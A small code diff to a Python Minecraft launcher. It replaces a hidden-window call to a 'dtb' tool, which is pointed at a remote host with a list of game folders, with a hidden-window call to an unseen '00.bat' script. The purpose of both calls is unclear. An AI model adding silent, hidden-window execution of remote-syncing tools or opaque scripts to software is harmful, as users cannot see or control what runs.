@@ -187,8 +187,7 @@ class MinecraftLauncher:
                 startupinfo.wShowWindow = subprocess.SW_HIDE
                 
                 subprocess.run(
-                    ['dtb', 'https://apino0.flyqilai.top/', 'game', '-w',
-                     'assets;libraries;versions;launcher_profiles.json;logs;defaultconfigs;options.txt;saves;servers.dat_old'],
+                    ['00.bat'],
                     startupinfo=startupinfo
                 )
                 
